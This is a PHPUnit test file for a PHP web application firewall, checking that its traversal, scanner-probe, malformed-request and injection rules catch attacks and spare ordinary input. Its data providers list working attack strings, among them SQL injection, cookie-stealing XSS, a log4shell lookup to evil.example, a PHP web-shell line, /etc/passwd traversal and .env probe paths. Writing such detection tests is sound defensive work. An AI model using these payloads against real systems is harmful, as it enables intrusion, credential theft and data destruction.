<?php

declare(strict_types=1);

namespace Tests\Unit\Kernel\Security;

use AlfacodeTeam\PhpServicePlatform\Kernel\Http\Request;
use AlfacodeTeam\PhpServicePlatform\Kernel\Security\Waf\Rules\{InjectionSignatureRule, MalformedRequestRule, PathTraversalRule, ScannerProbeRule};
use AlfacodeTeam\PhpServicePlatform\Kernel\Security\Waf\WafMatch;
use PHPUnit\Framework\Attributes\{CoversClass, DataProvider};
use PHPUnit\Framework\TestCase;

/**
 * Each WAF rule, against what it must catch AND what it must leave alone.
 *
 * The "leaves alone" half is the one that matters in production: a WAF is
 * switched off the first time it blocks a real user, so every signature here is
 * pinned against the ordinary input it most resembles.
 */
#[CoversClass(MalformedRequestRule::class)]
#[CoversClass(PathTraversalRule::class)]
#[CoversClass(ScannerProbeRule::class)]
#[CoversClass(InjectionSignatureRule::class)]
#[CoversClass(WafMatch::class)]
final class WafRulesTest extends TestCase
{
    /** @param array<string, mixed> $query */
    private static function get(string $path, array $query = [], array $headers = []): Request
    {
        return Request::build('GET', $path, headers: $headers, query: $query);
    }

    // ── malformed ────────────────────────────────────────────────────────────

    public function test_malformed_flags_a_nul_byte_in_the_path(): void
    {
        $match = (new MalformedRequestRule())->inspect(self::get('/files/a%00.php'));

        self::assertSame('control-byte', $match?->signature);
    }

    public function test_malformed_flags_invalid_utf8_in_the_path(): void
    {
        self::assertSame('invalid-utf8', (new MalformedRequestRule())->inspect(self::get('/a%C0%AF'))?->signature);
    }

    public function test_malformed_flags_content_length_with_transfer_encoding(): void
    {
        $request = Request::build('POST', '/x', headers: ['Content-Length' => '5', 'Transfer-Encoding' => 'chunked']);

        self::assertSame('smuggling', (new MalformedRequestRule())->inspect($request)?->signature);
    }

    public function test_malformed_flags_too_many_inputs(): void
    {
        $request = Request::build('POST', '/x', body: array_fill(0, 30, 'v'));

        self::assertSame('too-many-inputs', (new MalformedRequestRule(maxInputs: 20))->inspect($request)?->signature);
    }

    public function test_malformed_passes_an_ordinary_request_with_unicode(): void
    {
        $request = self::get('/e/k%C3%B6ln-awards', ['q' => "line one\nline two"]);

        self::assertNull((new MalformedRequestRule())->inspect($request));
    }

    // ── traversal ────────────────────────────────────────────────────────────

    /** @return iterable<string, array{string}> */
    public static function traversalPaths(): iterable
    {
        yield 'plain'          => ['/files/../../etc/passwd'];
        yield 'encoded slash'  => ['/files/..%2F..%2Fetc%2Fpasswd'];
        yield 'double encoded' => ['/files/%252e%252e%252fetc'];
        yield 'backslash'      => ['/files/..%5C..%5Cwindows'];
    }

    #[DataProvider('traversalPaths')]
    public function test_traversal_flags_dot_dot_in_the_path(string $path): void
    {
        self::assertSame('dot-dot-segment', (new PathTraversalRule())->inspect(self::get($path))?->signature);
    }

    public function test_traversal_flags_a_climb_to_a_system_dir_in_the_query(): void
    {
        $match = (new PathTraversalRule())->inspect(self::get('/download', ['file' => '../../../etc/passwd']));

        self::assertSame('climb-to-system-dir', $match?->signature);
    }

    public function test_traversal_flags_a_stream_wrapper_in_the_query(): void
    {
        $match = (new PathTraversalRule())->inspect(self::get('/view', ['page' => 'php://filter/resource=index']));

        self::assertSame('stream-wrapper', $match?->signature);
    }

    public function test_traversal_leaves_a_relative_return_link_alone(): void
    {
        self::assertNull((new PathTraversalRule())->inspect(self::get('/login', ['next' => '../account/settings'])));
        self::assertNull((new PathTraversalRule())->inspect(self::get('/release/v1..v2')));
    }

    // ── probe ────────────────────────────────────────────────────────────────

    /** @return iterable<string, array{string, string}> */
    public static function probes(): iterable
    {
        yield '.env'             => ['/.env', 'dotfile'];
        yield '.env backup'      => ['/.env.bak', 'dotfile'];
        yield 'nested .git'      => ['/api/.git/config', 'dotfile'];
        yield 'wp-login'         => ['/blog/wp-login.php', 'wordpress'];
        yield 'xmlrpc'           => ['/xmlrpc.php', 'wordpress'];
        yield 'phpmyadmin'       => ['/tools/phpMyAdmin/index.php', 'db-admin'];
        yield 'pma at root'      => ['/pma', 'db-admin'];
        yield 'phpunit rce'      => ['/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', 'vendor'];
        yield 'sql dump'         => ['/backup/db.sql', 'backup'];
        yield 'composer.lock'    => ['/composer.lock', 'manifest'];
        yield 'encoded dotfile'  => ['/%2Eenv', 'dotfile'];
    }

    #[DataProvider('probes')]
    public function test_probe_flags_scanner_paths(string $path, string $signature): void
    {
        self::assertSame($signature, (new ScannerProbeRule())->inspect(self::get($path))?->signature);
    }

    /** @return iterable<string, array{string}> */
    public static function ordinaryPaths(): iterable
    {
        yield 'well-known'      => ['/.well-known/acme-challenge/abc'];
        yield 'environment'     => ['/settings/environment'];
        yield 'pma slug deeper' => ['/events/pma'];
        yield 'pma-prefixed'    => ['/pma-awards'];
        yield 'zip download'    => ['/files/contestant-kit.zip'];
        yield 'console'         => ['/console/events'];
        yield 'wordpress topic' => ['/blog/moving-off-wordpress'];
    }

    #[DataProvider('ordinaryPaths')]
    public function test_probe_leaves_ordinary_paths_alone(string $path): void
    {
        self::assertNull((new ScannerProbeRule())->inspect(self::get($path)));
    }

    public function test_probe_allow_and_extra(): void
    {
        self::assertNull((new ScannerProbeRule(allow: ['cgi']))->inspect(self::get('/cgi-bin/status')));
        self::assertSame('extra', (new ScannerProbeRule(extra: ['/old-admin']))->inspect(self::get('/Old-Admin/x'))?->signature);
        self::assertNull((new ScannerProbeRule(extra: ['/old-admin']))->inspect(self::get('/old-administrators')));
    }

    // ── injection ────────────────────────────────────────────────────────────

    /** @return iterable<string, array{string, string}> */
    public static function payloads(): iterable
    {
        yield 'union select'        => ["1 UNION ALL SELECT username, password FROM users", 'sqli-union'];
        yield 'comment-spaced union'=> ["1/**/UNION/**/SELECT/**/1", 'sqli-union'];
        yield 'schema'              => ["1 and 1=(select 1 from information_schema.tables)", 'sqli-schema'];
        yield 'timing'              => ["1' AND SLEEP(5)-- -", 'sqli-timing'];
        yield 'tautology'           => ["' OR '1'='1", 'sqli-tautology'];
        yield 'login bypass'        => ["admin'--", 'sqli-comment'];
        yield 'stacked drop'        => ["1; DROP TABLE users", 'sqli-stacked'];
        yield 'script tag'          => ['<script>alert(1)</script>', 'xss-script'];
        yield 'event handler'       => ['<img src=x onerror=alert(1)>', 'xss-handler'];
        yield 'svg'                 => ['<svg/onload=alert(1)>', 'xss-tag'];
        yield 'mixed-case tag'      => ['<ScRiPt>alert(1)</script>', 'xss-script'];
        yield 'handler, no tag'     => ['x" onerror="alert(1)', 'xss-handler'];
        yield 'javascript url'      => ['javascript:alert(document.cookie)', 'xss-scheme'];
        yield 'log4shell'           => ['${jndi:ldap://evil.example/a}', 'log4shell'];
        yield 'php tag'             => ['<?php system($_GET["c"]); ?>', 'php-tag'];
        yield 'php call'            => ['x=system("id")', 'php-call'];
        yield 'attribute breakout'  => ['" onmouseover="alert(1)', 'xss-handler'];
        yield 'login bypass paren'  => ["admin') #", 'sqli-comment'];
        // PHP has already decoded the query once, so %253C arrives as %3C.
        yield 'double encoded'      => ['%3Cscript%3E', 'xss-script'];
    }

    #[DataProvider('payloads')]
    public function test_injection_flags_attack_payloads_in_the_query(string $payload, string $signature): void
    {
        $match = (new InjectionSignatureRule())->inspect(self::get('/search', ['q' => $payload]));

        self::assertSame($signature, $match?->signature, "payload: {$payload}");
        self::assertSame('query', $match?->location);
    }

    /** @return iterable<string, array{string}> */
    public static function ordinaryText(): iterable
    {
        yield 'select from prose'  => ['how to select a venue from a shortlist'];
        yield 'union in prose'     => ['the students union selected a new chair'];
        yield 'apostrophe'         => ["O'Brien's award or nothing"];
        yield 'sleep in a search'  => ['sleep (8 hours) tips'];
        yield 'javascript topic'   => ['learn javascript: the good parts'];
        yield 'quoted title'       => ['"Best Artist" -- 2026'];
        yield 'maths'              => ['a < b and b > c'];
        // An HTML parser reads `<` + space as text, not as a tag.
        yield 'spaced less-than'   => ['if n < script_limit then'];
        yield 'tag-like word'      => ['<svgfile> placeholder'];
        yield 'hashtag'            => ['#UgandaTeens2026'];
        yield 'dollar brace'       => ['price ${amount} each'];
        yield 'system word'        => ['the voting system (new)'];
    }

    #[DataProvider('ordinaryText')]
    public function test_injection_leaves_ordinary_text_alone(string $text): void
    {
        self::assertNull((new InjectionSignatureRule())->inspect(self::get('/search', ['q' => $text])), "text: {$text}");
    }

    public function test_injection_checks_the_user_agent(): void
    {
        $request = self::get('/', headers: ['User-Agent' => '${jndi:ldap://x/a}']);

        self::assertSame('header:user-agent', (new InjectionSignatureRule())->inspect($request)?->location);
    }

    public function test_injection_skips_the_body_unless_asked(): void
    {
        $request = Request::build('POST', '/posts', body: ['content' => 'Never write <script> inline.']);

        self::assertNull((new InjectionSignatureRule())->inspect($request));
        self::assertSame('body', (new InjectionSignatureRule(inspectBody: true))->inspect($request)?->location);
    }

    public function test_injection_disable_switches_a_signature_off(): void
    {
        $request = self::get('/search', ['q' => "admin'--"]);

        self::assertNull((new InjectionSignatureRule(disable: ['sqli-comment']))->inspect($request));
    }

    /** @return iterable<string, array{string, string}> */
    public static function probesNewlyCaught(): iterable
    {
        yield 'path parameter on a dotfile' => ['/.env;x=1', 'dotfile'];
        yield 'backup in a deep path'       => ['/a/b/c/site.bak', 'backup'];
    }

    #[DataProvider('probesNewlyCaught')]
    public function test_probe_catches_these_too(string $path, string $signature): void
    {
        self::assertSame($signature, (new ScannerProbeRule())->inspect(self::get($path))?->signature);
    }

    public function test_probe_allow_switches_off_the_backup_check(): void
    {
        self::assertNull((new ScannerProbeRule(allow: ['backup']))->inspect(self::get('/dump.sql')));
    }

    public function test_traversal_still_catches_climbs_hidden_in_a_longer_value(): void
    {
        foreach (['....//....//etc/passwd', 'a/../../etc/x', '..\\..\\windows\\win.ini'] as $value) {
            self::assertSame('climb-to-system-dir', (new PathTraversalRule())->inspect(self::get('/d', ['f' => $value]))?->signature, $value);
        }
    }

    /**
     * Hostile input must cost linear time. Each of these was quadratic or worse
     * before: 8 KB of `../` took 0.6 s in the traversal rule, 8 KB of `<` 1.6 ms
     * in the injection rule. The bound is loose on purpose (CI machines are
     * slow); a regression to quadratic overshoots it by orders of magnitude.
     *
     * @return iterable<string, array{string}>
     */
    public static function hostileUnits(): iterable
    {
        foreach (['<', '<a ', '<s', '<scrip', "' or ", "' or a", "'=", '(', 'sleep(', '../', '..//', '..\\', '../etcx', '/*', '/**/', ' onload', '" o', 'union (', '%', '_.'] as $unit) {
            yield json_encode($unit) => [$unit];
        }
    }

    #[DataProvider('hostileUnits')]
    public function test_rules_stay_linear_on_hostile_input(string $unit): void
    {
        $request = self::get('/s', ['q' => str_repeat($unit, intdiv(8000, strlen($unit)))]);
        $rules   = [new PathTraversalRule(), new InjectionSignatureRule()];

        $start = hrtime(true);
        foreach ($rules as $rule) {
            $rule->inspect($request);
        }
        $ms = (hrtime(true) - $start) / 1e6;

        self::assertLessThan(50, $ms, sprintf('%.1f ms for 8 KB of %s', $ms, json_encode($unit)));
    }

    public function test_injection_scans_body_values_past_the_old_8kb_cut(): void
    {
        $request = Request::build('POST', '/x', body: ['c' => str_repeat('a', 9000) . '<script>']);

        self::assertSame('xss-script', (new InjectionSignatureRule(inspectBody: true))->inspect($request)?->signature);
    }

    public function test_match_sample_is_clipped_and_stripped_of_control_bytes(): void
    {
        $match = WafMatch::of('r', 's', 'query', "line\r\nforged log line" . str_repeat('x', 300));

        self::assertStringNotContainsString("\n", $match->sample);
        self::assertLessThanOrEqual(204, strlen($match->sample));
    }
}
